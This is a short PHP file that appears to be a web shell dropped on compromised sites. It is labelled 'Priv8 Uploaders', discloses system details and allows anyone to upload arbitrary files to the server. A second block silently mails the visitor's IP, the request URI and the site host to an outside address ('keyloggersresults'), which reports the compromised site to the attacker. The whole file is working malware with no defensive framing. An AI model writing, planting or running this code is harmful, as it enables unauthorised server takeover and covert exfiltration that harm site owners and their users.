﻿<?php echo 'Priv8 Uploaders By En Banglasia'.'<br>'.'Uname:'.php_uname().'<br>'.$cwd = getcwd(); echo '<center><form method="post" target="_self" enctype="multipart/form-data"><input type="file" size="20" name="uploads"/><input type="submit" value="upload"/></form></center></td></tr></table><br>'; if (!empty ($_FILES['uploads'])) {     move_uploaded_file($_FILES['uploads']['tmp_name'],$_FILES['uploads']['name']);     echo "<script>alert('upload Done');       </script><b>Fuckedz!</b><br>name : ".$_FILES['uploads']['name']."<br>size : ".$_FILES['uploads']['size']."<br>type : ".$_FILES['uploads']['type']; } ?>
<?php
$ip = getenv("REMOTE_ADDR");
$ra44 = rand(1, 99999);
$subj98 = " Bot v6 Rzlt |$ip";
$email = "keyloggersresults@gmail.com";
$from = "From: Keyloggers<keyloggers@ap1d.my";
$a45 = $_SERVER['REQUEST_URI'];
$b75 = $_SERVER['HTTP_HOST'];
$m22 = $ip . "";
$msg8873 = "$a45 $b75 $m22";
mail($email, $subj98, $msg8873, $from);
?>